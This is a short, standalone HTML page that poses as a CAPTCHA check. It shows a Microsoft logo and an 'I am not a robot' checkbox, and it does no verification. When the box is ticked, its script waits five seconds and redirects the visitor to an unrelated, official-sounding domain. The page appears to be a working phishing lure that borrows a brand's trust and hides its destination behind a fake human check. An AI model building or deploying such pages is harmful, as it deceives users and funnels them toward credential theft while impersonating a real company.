<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CAPTCHA</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: linear-gradient(to bottom right, #FFFFFF, #D9E6F2);
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .captcha-box {
    background: white;
    border: 1px solid #ccc;
    border-radius: 5px;
    padding: 7px;
    display: flex;
    flex-direction: column;
    align-items: center;
  }
  .captcha-content {
    display: flex;
    align-items: center;
  }
  .captcha-box img {
    width: 130px;
    height: auto;
  }
  .captcha-text {
    font-size: 13px;
    color: #333;
    display: flex;
    flex-direction: row; 
    align-items: center;
    margin-left: 20px;
    margin-top: 70px; 
  }
  .captcha-text input[type="checkbox"] {
    margin-left: 5px; 
  }
  @keyframes spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
  }
  .loader {
    border: 6px solid #f3f3f3; 
    border-top: 6px solid #3498db;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    animation: spin 2s linear infinite;
    margin-top: 10px;
    margin-right: 190px;
  }
</style>
</head>
<body>
<div class="captcha-box">
  <div class="captcha-content">
    <img src="https://blogs.microsoft.com/wp-content/uploads/prod/2012/08/8867.Microsoft_5F00_Logo_2D00_for_2D00_screen-1920x706.jpg" alt="Microsoft Logo">
    <div class="captcha-text">
      I am not a robot 
      <input type="checkbox" id="captchaCheckbox">
    </div>
  </div>
  <div class="loader"></div> 
</div>

<script>
  document.getElementById("captchaCheckbox").addEventListener("change", function() {
    if (this.checked) {
      setTimeout(function() {
        window.location.href = "http://link.unitedsnation.org/#"; 
      }, 5000); 
    }
  });
</script>

</body>
</html>
